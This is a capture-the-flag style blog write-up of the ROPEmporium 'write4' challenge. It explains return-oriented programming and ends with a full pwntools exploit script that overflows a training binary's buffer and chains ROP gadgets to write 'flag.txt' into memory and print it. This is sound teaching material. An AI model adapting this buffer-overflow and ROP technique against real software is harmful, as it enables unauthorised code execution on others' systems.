---
title: ROPEmporium - Write4
date: 2022-10-11 12:00:00
categories: [Research, Exploits]
tags: [buffer-overflow, rop, exploit, python, pwntools, ropemporium]     # TAG names should always be lowercase
img_path: /assets/img/Other/ROPWrite4
---
For this second post about Binary Exploitation, I was originally going to do just one step up from [the last one](https://slimicide.github.io/posts/Basic-Buffer-Overflows/),
but then I decided the act of pushing arguments onto the stack for use in a function wasn't worth a whole post on its
own. So I have ultimately decided to kick it up a few notches and dive right into Write4 from [ROPEmporium](https://ropemporium.com/) and hopefully
fill in the blanks as I go.

The first post involved overflowing the buffer and overwriting EIP to return to the `win()` function. This post is
going to involve Return-Oriented Programming (ROP). To understand ROP, first you need to understand the `RET` instruction.

# Return-Oriented Programming
In some traditional beginner pwn challenges, the NX protection mentioned in the previous post will be disabled.
This means you can overflow the buffer, drop your shellcode on the stack, `jmp esp` and you have arbitrary code execution.<br>

In cases where NX protection is enabled, you cannot write and execute your own shellcode. This is where ROP comes in.
While the stack may not be executable, instructions inside the binary are. ROP is the process of taking instructions
within the binary and chaining them together in creative ways to achieve your goal. That's all well and good but how
do you go about chaining these random instructions together?

With the `RET` instruction.

Instructions that can be potentially used in ROP Chains are called ROP Gadgets. There is a reason not all instructions
are ROP Gadgets and it is because of the presence (or lack thereof) of the `RET` instruction.

The `RET` instruction is essentially an alias for `POP EIP`. When `RET` is executed, the value at the top of the stack
is popped into EIP to continue execution. We are granted full write access to the stack through the initial buffer overflow.
We get to control what address gets `RET`'d into EIP  and through that, we can generate our own chain of instructions
as long as those instructions end in `RET`.

If this isn't clear now, it will hopefully be clearer seeing it in action.

# Write4

RopEmporium doesn't provide source code with the challenges but they do give you a good idea of what to do. Write4
is a challenge centered on using ROP to write to memory. The goal is to write `flag.txt` to a writeable memory address
so we can use it as an argument to the `print_file()` function.

In the interest of saving time and not repeating stuff from the [first post](https://slimicide.github.io/posts/Basic-Buffer-Overflows/),
the offset to EIP is 44-bytes of junk data. Now we can start looking for ROP Gadgets.

Inside the binary's conveniently named `usefulGadgets()`function lies a gadget we can use to write to memory.

![usefulGadget](usefulGadget.png "usefulGadget")
_usefulGadget_

This gadget allows us to move the value stored in the EBP register to the address referenced by EDI. To make use of
this gadget, we're going to need a `POP EBP` gadget, a `POP EDI` gadget and finally a writeable address in memory, none
of which were particularly hard to find. Using `ropper`, I found a single gadget that'll handle both necessary `POP`
operations.

![popGadget](popGadget.png "popGadget")
_pop edi; pop ebp; ret;_

Using `readelf` to view sections of the binary, I found `.data` is writable and is 8-bytes in size at address `0x0804a018`.
It's the perfect size to fit `flag.txt` which is also 8-bytes. PIE is disabled so the address shown will work fine.

![writeLocation](writeLocation.png "writeLocation")
_.data_

There is one small catch. 32-bit memory addresses are just that, 32-bit. Each one can only hold 4-bytes. This means
in order to fit the full `flag.txt` in there, we're going to need to perform two writes: one with `flag`, the other with `.txt`.

There is one final thing to do before we can get writing an exploit. We need the address of the `print_file()` function.
It can be found inside `usefulFunction()`.

![usefulFunction](usefulFunction.png "usefulFunction")
_usefulFunction_

Now we have everything we need for an exploit.

# Building an Exploit

Here is what we have:
```
Offset to EIP:                          44 Bytes
Writeable Location in Memory:           0x0804a018
"POP EDI; POP EBP;" ROP Gadget:         0x080485aa
"MOV DWORD PTR [EDI], EBP" ROP Gadget:  0x08048543
"print_file" Function:                  0x08048538
```
Now we can begin constructing an exploit step-by-step:

Excessive commenting used to help follow what's going on.
```python
#!/bin/env python3

from pwn import *                    #Import the Pwntools library

offset = 44                          #Offset to EIP
location = 0x0804a018                #Writeable Location in Memory
pop_edi_pop_ebp = p32(0x080485aa)    #"POP EDI; POP EBP;" ROP Gadget packed by Pwntools
mov_ptr_edi_ebp = p32(0x08048543)    #"MOV DWORD PTR [EDI], EBP" ROP Gadget packed by Pwntools
print_file = p32(0x08048538)         #"print_file" Function packed by Pwntools

payload = b'A' * offset              #Generates 44-bytes of junk data

payload += pop_edi_pop_ebp           #EIP is set to our first gadget to kick off the chain, it will pop off the next two items on the stack.
payload += p32(location)             #Writeable Location will be popped by the previous gadget into EDI
payload += b"flag"                   #"flag" will be popped by the previous gadget into EBP
payload += mov_ptr_edi_ebp           #First RET lands here, the value in EBP (flag) will be written to the address referenced by EDI (Writeable Location)

#First write complete, "flag" is written to memory.
#In the second write, location will be offset by 4-bytes so as not to overwrite "flag"

payload += pop_edi_pop_ebp           #Second RET lands here, this gadget will pop off the next two items on the stack.
payload += p32(location+0x4)         #Writeable Location will be popped by the previous gadget into EDI, offset by 4 bytes to complete the write.
payload += b".txt"                   #".txt" will be popped by the previous gadget into EBP
payload += mov_ptr_edi_ebp           #Third RET lands here, the value in EBP (.txt) will be written to the address referenced by EDI (Writeable Location+0x4)

#Second write complete, "flag.txt" is written to memory at address: 0x0804a018
#Time to call print_file() and supply location as an argument.

payload += print_file                #Fourth RET lands here, call print_file
payload += p32(location)             #flag.txt supplied as argument to print_file

#Call Pwntools to run the binary and execute the exploit.

p = process("./write432")            #Start local process
p.sendlineafter(b"> ", payload)      #Send the crafted payload
p.interactive()                      #Receive all data
```
![exploit](exploit.png "exploit")
_Exploit_

# :)
